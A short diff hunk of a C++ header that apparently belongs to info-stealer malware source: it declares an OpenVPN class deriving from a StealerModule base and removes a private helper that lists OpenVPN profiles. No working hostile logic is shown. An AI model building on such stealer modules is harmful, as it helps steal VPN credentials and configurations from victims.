@@ -11,8 +11,6 @@
 class OpenVPN : public StealerModule {
 public:
     void execute(fs::path &root) override;
-private:
-    static std::vector<fs::path> openvpnProfiles();
 };
 
 
